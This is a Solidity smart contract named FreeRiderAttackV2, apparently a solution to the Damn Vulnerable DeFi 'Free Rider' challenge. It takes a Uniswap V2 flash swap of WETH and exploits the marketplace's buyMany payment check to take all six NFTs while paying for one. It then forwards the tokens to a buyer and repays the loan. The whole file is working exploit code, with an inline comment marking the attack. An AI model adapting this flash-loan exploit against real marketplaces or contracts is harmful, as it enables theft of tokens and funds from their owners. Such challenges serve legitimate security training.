// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

import "./FreeRiderNFTMarketplace.sol";
import "../DamnValuableNFT.sol";


interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender, 
        uint amount0, 
        uint amount1, 
        bytes calldata data
        ) external;
}

contract FreeRiderAttackV2 is IUniswapV2Callee, IERC721Receiver{
    using Address for address payable;

    address payable immutable weth;
    address immutable factory;
    address public pair;
    address payable immutable marketplace;
    address immutable buyer;

    address public tokenToBorrow;
    uint256 public amount;
    uint256 PRICE = 14 ether;
    uint256 ID = uint256(0);

    FreeRiderNFTMarketplace market;
    DamnValuableNFT token;

    constructor(address _weth, address _factory, address _market, address _token, address _owner) {
        weth = payable(_weth);
        factory = _factory;
        marketplace = payable(_market);

        market = FreeRiderNFTMarketplace(payable(_market));
        token = DamnValuableNFT(_token);
        buyer = _owner;
    }

    event Log(string message, uint256 val);
    
    function flashSwap(address _pair, address _tokenToBorrow, uint256 _amount, bytes memory data) external {
        pair = _pair;
        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();

        uint256 amount0Out = _tokenToBorrow == token0 ? _amount : 0;
        uint256 amount1Out = _tokenToBorrow == token1 ? _amount : 0;

        tokenToBorrow = _tokenToBorrow;
        amount = _amount;

        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), data);
    }
    
    function uniswapV2Call(
        address sender, 
        uint amount0, 
        uint amount1, 
        bytes calldata data
        ) external override {
        require(msg.sender == pair, 'msg.sender is not pair');
        require(sender ==  address(this), '_sender is not this contract');
        
        weth.functionCall(abi.encodeWithSignature('withdraw(uint256)', amount));
        //=============================== Here goes the attack 
        {
           
           ( uint256[] memory arr, uint256 _amount ) = abi.decode(data, (uint256[], uint256));
            //Here we take all NFTs with just paying for one
            market.buyMany{value:_amount}(arr);

            for(uint8 i = 0 ; i < 6; i++){
            token.safeTransferFrom(address(this), buyer, i);
            }
        }


        //=============================== Here we repay the 

        uint256 fee = ((amount * 3) / 997) + 1;
        uint256 value = amount + fee;
        weth.functionCallWithValue(abi.encodeWithSignature('deposit()'), value);

        weth.functionCall(abi.encodeWithSignature('transfer(address,uint256)', msg.sender, value));

       emit Log('amountRequired', value);

        }

        function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) 
        external
        override
        returns (bytes4) 
    {
        return IERC721Receiver.onERC721Received.selector;
    }

        receive() external payable {

        }
}